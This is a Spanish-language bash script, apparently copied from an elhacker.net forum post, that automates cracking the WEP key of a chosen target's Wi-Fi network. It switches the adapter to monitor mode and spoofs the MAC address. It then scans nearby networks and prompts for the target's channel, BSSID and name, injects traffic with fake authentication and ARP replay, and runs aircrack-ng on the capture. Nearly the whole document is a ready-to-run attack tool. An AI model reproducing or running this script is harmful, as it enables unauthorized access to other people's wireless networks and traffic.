#! /bin/bash
#Script wifihack por snakingmax.
# http://foro.elhacker.net/hacking_wireless/script_sencillo_para_hackear_claves_wep_funcionando-t284110.0.html
# Paquetes necesarios macchanger

sudo rm -r /tmp/wifihack/
sudo mkdir /tmp/wifihack/
 
# PASO 0 - ACTIVAR EL DRIVER MONITOR:
sudo airmon-ng stop mon0;
sudo airmon-ng start wlan0;
 
# PASO 0.1 - PONERME UNA MAC FALSA. Fabada mola xD
sudo ifconfig mon0 down;
sudo macchanger --mac=00:FA:BA:DA:CA:BE mon0
sudo ifconfig mon0 up;
 
# PASO 1 - LISTAR LAS WIFIS:
xterm -title "Detectando wifis (paralo cuando quieras)." -e sudo airodump-ng mon0 -w "/tmp/wifihack/wifiList";
cat /tmp/wifihack/wifiList-01.kismet.netxml | grep -e 'essid' -e 'BSSID'  -e 'channel' -e 'encryption' > /tmp/wifihack/wifis |
firefox "/tmp/wifihack/wifis";
 
# Un inciso para preguntar:
j="n";
while test $j != "s"
do
clear;
echo Dime el canal del punto de acceso:
read canal
echo Dime la mac del router del objetivo:
read MAC_OBJETIVO
echo Dime el nombre de la wifi del objetivo:
read NOMBRE_AP
echo "¿Estás seguro de que lo has escrito bien (s/n)?"
read j
done
echo Vamos a empezar con el proceso entonces.
 
# PASO 2 - PONER EL AIRODUMP:
xterm -hold  -title "Pinchando la conexión del objetivo" -e sudo airodump-ng -c $canal -w /tmp/wifihack/captura mon0 &
 
# PASO 3 - HACERSE AMIGO DEL ROUTER DEL OBJETIVO:
# e inyectar algo de tráfico cada 5 segundos.
xterm -hold -title "Me estoy haciendo amigo del router del objetivo" -e "for (( i=0; i<=1000; i++ )) do sudo aireplay-ng -1 0 -a $MAC_OBJETIVO -h 00:FA:BA:DA:CA:BE -e $NOMBRE_AP mon0; sleep 5; done" &
 
# PASO 4 - ESNIFAR ROUTER DEL OBJETIVO:
xterm -hold -title "Almacenando los datos de la conexion pinchada" -e sudo aireplay-ng -3 -b $MAC_OBJETIVO -h 00:FA:BA:DA:CA:BE mon0 &
 
# PASO 5 - OBTENER LA CLAVE A PARTIR DE LO QUE ESNIFAMOS:
xterm -hold -title "Pulsa una tecla para intentar crackear" -e "for (( i=0; i<=1000; i++ )) do read a; sudo aircrack-ng -a 1 -s /tmp/wifihack/captura-01.cap; done"

http://foro.elhacker.net/hacking_wireless/script_sencillo_para_hackear_claves_wep_funcionando-t284110.0.html#ixzz1faFH80eR
